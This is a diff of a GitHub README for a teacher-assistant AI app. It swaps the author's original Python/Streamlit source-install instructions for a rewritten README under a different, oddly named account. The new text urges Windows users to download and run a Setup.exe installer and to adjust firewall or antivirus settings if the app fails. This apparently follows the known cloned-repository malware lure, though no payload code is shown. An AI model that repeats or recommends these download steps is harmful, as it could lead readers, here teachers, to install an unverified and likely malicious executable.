@@ -1,299 +1,97 @@
+# 🤖 AI-Assistant-For-Teachers - Simplify Lesson Planning Tasks
+
+[![Download AI-Assistant-For-Teachers](https://img.shields.io/badge/Download-AI--Assistant--For--Teachers-brightgreen)](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers)
+
+## 📋 About AI-Assistant-For-Teachers
+
+AI-Assistant-For-Teachers is a tool that helps teachers create lesson summaries, quizzes, and explanations quickly. It uses AI to read educational content and generate materials that save time and support lesson planning. The app runs on Windows and uses simple technology designed so anyone can use it without prior coding experience.
+
+## ⚙️ System Requirements
+
+Before you start, make sure your computer meets these requirements:
+
+- Operating System: Windows 10 or later
+- Processor: Intel or AMD 1.4 GHz or faster
+- Memory: At least 4 GB RAM
+- Storage: 500 MB free space
+- Network: Internet connection for initial setup and AI processing
+- Software: Python 3.8 or higher (if not included in download)
+- Browser: Latest version of Chrome, Edge, or Firefox
+
+## 🛠️ Features
+
+- Quickly create lesson summaries based on input material.
+- Generate quizzes with multiple-choice questions.
+- Get AI-driven explanations to enhance understanding.
+- Simple user interface to upload content and receive results.
+- No need to write code or manage servers.
+
+## 🚀 Getting Started
+
+Follow these steps to get the AI-Assistant-For-Teachers app running on your Windows PC.
+
+### 1. Download the app
+
+Visit this page to download the app:
+  
+[![Download Here](https://img.shields.io/badge/Download-AI--Assistant--For--Teachers-blue)](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers)
+
+This link takes you to the main repository where you will find the latest version under the "Releases" section. Look for the Windows installer or a file named similarly to `AI-Assistant-For-Teachers-Setup.exe`.
+
+### 2. Run the installer
+
+- Locate the downloaded installer file, usually in your Downloads folder.
+- Double-click the `.exe` file to start the installation.
+- Follow the instructions on the screen. Choose default options unless you want a custom setup.
+- Wait for the installation to finish.
+
+### 3. Launch the application
+
+- After installation, find the AI-Assistant-For-Teachers icon on your desktop or in the Start menu.
+- Click to open the app.
+- The app uses Streamlit, so it will open in a web browser window automatically.
+
+## 🖥️ How to Use AI-Assistant-For-Teachers
+
+Once the app is open, you can start using it immediately. Here’s how:
+
+### Upload your educational content
+
+- Click the button to upload files (PDFs, Word documents, or text files).
+- Or paste text directly into the input box.
+  
+### Generate lesson materials
+
+- Choose the type of content you want to create:
+  - Lesson summary
+  - Quiz questions
+  - AI explanations
+- Click “Generate.” The AI reads the content and produces the material.
+- You can edit or save the output.
+
+### Save or export your work
+
+- Use the provided options to save results as text files or PDFs.
+- Print directly from the app if needed.
+
+## 🔧 Troubleshooting Tips
+
+- The app requires an internet connection since it uses AI APIs.
+- If it does not load, check your firewall or antivirus settings.
+- Make sure you have the latest version of Python installed if you see an error related to Python.
+- Restart the app or your PC if it freezes.
+- If files won’t upload, confirm they are supported formats like PDF or TXT.
+
+## 📚 Additional Information
+
+This app uses large language models (LLMs) through APIs to create content quickly. It is designed for teachers but does not replace professional curriculum planning. Use it as a helper for preparing materials efficiently.
+
+## 🔗 Useful Links
+
+- Main repository page: [AI-Assistant-For-Teachers on GitHub](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers)
+- Issues and support: Use the "Issues" tab on GitHub for reporting problems.
+- Documentation and tutorials: Check the wiki or README files inside the repo for detailed guides.
 
 ---
 
-# 🎓 AI Teacher Assistant
-
-![Python](https://img.shields.io/badge/Python-3.14-blue)
-![Streamlit](https://img.shields.io/badge/Framework-Streamlit-red)
-![AI](https://img.shields.io/badge/AI-GPT--Powered-green)
-![License](https://img.shields.io/badge/License-MIT-yellow)
-![Status](https://img.shields.io/badge/Status-Active-success)
-
-An **AI-Powered Teaching Companion** designed to help educators automate academic tasks, analyze student performance, and improve teaching efficiency using modern Artificial Intelligence.
-
----
-
-# 🌍 Live Demo
-
-Try the application online:
-
-### 🚀 Streamlit Deployment
-
-[https://ai-assistant-for-teachers.streamlit.app](https://ai-assistant-for-teachers.streamlit.app)
-
-### 🤗 Hugging Face Deployment
-
-[https://huggingface.co/spaces/Kambere-44/ai-teacher-assistant](https://huggingface.co/spaces/Kambere-44/ai-teacher-assistant)
-
----
-
-# 📖 Project Overview
-
-Teachers spend a large portion of their time performing repetitive academic tasks such as:
-
-• Creating quizzes and assessments
-• Analyzing student performance
-• Preparing lesson plans
-• Summarizing learning materials
-• Providing individualized student support
-
-These activities reduce time available for **student engagement and personalized learning**.
-
-The **AI Teacher Assistant** solves this by integrating **Artificial Intelligence into the teaching workflow**, allowing teachers to automate tasks and focus more on teaching.
-
----
-
-# ✨ Key Features
-
-## 📊 Student Performance Analysis
-
-Upload classroom datasets and receive **instant insights**.
-
-Features include:
-
-* Student performance breakdown
-* Attendance analytics
-* Data visualization dashboards
-* Class trend analysis
-* AI recommendations for improvement
-
----
-
-## 📝 AI Quiz Generator
-
-Generate quizzes automatically for faster classroom assessments.
-
-Capabilities include:
-
-* Auto-generated MCQ questions
-* Adjustable difficulty levels
-* Downloadable DOCX exam papers
-* Instant test creation
-
----
-
-## 📚 Lesson Summarization
-
-Convert large lesson materials into **clear and concise summaries**.
-
-Teachers can:
-
-* Upload lesson PDFs
-* Extract key concepts automatically
-* Generate quick revision notes
-* Simplify teaching preparation
-
----
-
-## 🧠 AI Lesson Planner
-
-Generate structured lesson plans in seconds.
-
-The AI creates:
-
-* Learning objectives
-* Teaching activities
-* Student engagement techniques
-* Assessment strategies
-* Multimedia learning suggestions
-
----
-
-## 💬 AI Counsellor for Teachers
-
-A supportive AI assistant designed to help teachers manage classroom stress and professional burnout.
-
-Provides:
-
-* Stress support
-* Reflective teaching guidance
-* Classroom challenge advice
-* Positive reinforcement conversations
-
----
-
-# 📸 Application Preview
-
-## 📊 Student Performance Analysis
-
-![Performance Analysis](screenshots/perfomance_analysis.png)
-
----
-
-## 🧠 AI Lesson Planner
-
-![Lesson Plan](screenshots/lesson_plan.png)
-
----
-
-## 📚 Lesson Summarizer
-
-![Lesson Summary](screenshots/lesson_summarize.png)
-
----
-
-## 📝 Quiz Generator
-
-![Quiz Generator](screenshots/generate_quiz.png)
-
----
-
-## 💬 Teacher Wellness Assistant
-
-![Teacher Wellness](screenshots/teacher_wellness.png)
-
----
-
-# 🧠 Technology Stack
-
-| Technology  | Purpose                           |
-| ----------- | --------------------------------- |
-| Python      | Backend logic                     |
-| Streamlit   | Interactive web interface         |
-| OpenAI GPT  | AI reasoning & content generation |
-| Pandas      | Data analysis                     |
-| Matplotlib  | Data visualization                |
-| Seaborn     | Statistical graphs                |
-| Python-DOCX | Exam paper generation             |
-| PyPDF       | Lesson text extraction            |
-
----
-
-# 🏗️ Project Structure
-
-```
-AI-Assistant
-│
-├── app.py
-├── ai.py
-├── animations.py
-├── customquery.py
-├── LessonPlan.py
-├── lessonSummarize.py
-├── MCQ.py
-├── teacheanalysis.py
-├── wellness.py
-│
-├── dataset_for_hackprix.csv
-├── screenshots
-│   ├── perfomance_analysis.png
-│   ├── teacher_wellness.png
-│   ├── lesson_summarize.png
-│   ├── lesson_plan.png
-│   └── generate_quiz.png
-│
-├── requirements.txt
-└── README.md
-```
-
----
-
-# ⚙️ Installation
-
-### 1️⃣ Clone Repository
-
-```bash
-git clone https://github.com/Kambere-44/AI-Assistant-For-Teachers.git
-cd AI-Assistant-For-Teachers
-```
-
----
-
-### 2️⃣ Create Virtual Environment
-
-```bash
-python -m venv venv
-```
-
-Activate environment
-
-Windows
-
-```
-venv\Scripts\activate
-```
-
-Linux / Mac
-
-```
-source venv/bin/activate
-```
-
----
-
-### 3️⃣ Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
----
-
-### 4️⃣ Run the Application
-
-```bash
-streamlit run app.py
-```
-
----
-
-# 🎯 Target Users
-
-* Teachers
-* Schools
-* Online educators
-* Academic institutions
-* Educational researchers
-
----
-
-# 🚀 Future Improvements
-
-Planned upgrades include:
-
-* AI grading assistant
-* Curriculum generator
-* Student progress prediction
-* LMS integration
-* Voice-enabled teaching assistant
-* Uganda syllabus dataset integration
-
----
-
-# 👨‍💻 Author
-
-**Mark Kambere**
-
-AI Developer | Software Engineer | EdTech Innovator
-
-GitHub
-[https://github.com/Kambere-44](https://github.com/Kambere-44)
-
----
-
-# 📜 License
-
-This project is licensed under the **MIT License**.
-
----
-
-# ⭐ Support the Project
-
-If you find this project useful:
-
-⭐ Star the repository
-🍴 Fork the project
-🤝 Contribute improvements
-
----
-
-✅ After updating the README, push it:
-
-```bash
-git add README.md
-git commit -m "Updated README with screenshots and live demos"
-git push
-```
-
----
-
+[Download AI-Assistant-For-Teachers](https://github.com/slavelike-terrainintelligence494/AI-Assistant-For-Teachers) to start simplifying your lesson planning today.
